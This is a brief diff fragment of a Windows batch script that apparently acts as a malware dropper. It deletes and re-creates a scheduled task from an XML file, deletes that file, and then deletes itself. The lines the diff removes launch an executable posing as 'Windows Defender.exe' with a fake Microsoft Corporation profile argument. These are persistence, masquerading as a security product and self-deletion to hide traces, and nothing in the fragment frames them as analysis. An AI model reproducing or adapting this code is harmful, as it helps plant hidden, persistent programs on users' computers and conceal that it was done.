@@ -56,6 +56,4 @@ schtasks /Delete /TN "%SID%XYZ" /F
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
 
-"%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
-endlocal
 DEL /s /f /q /a "%~f0" && exit
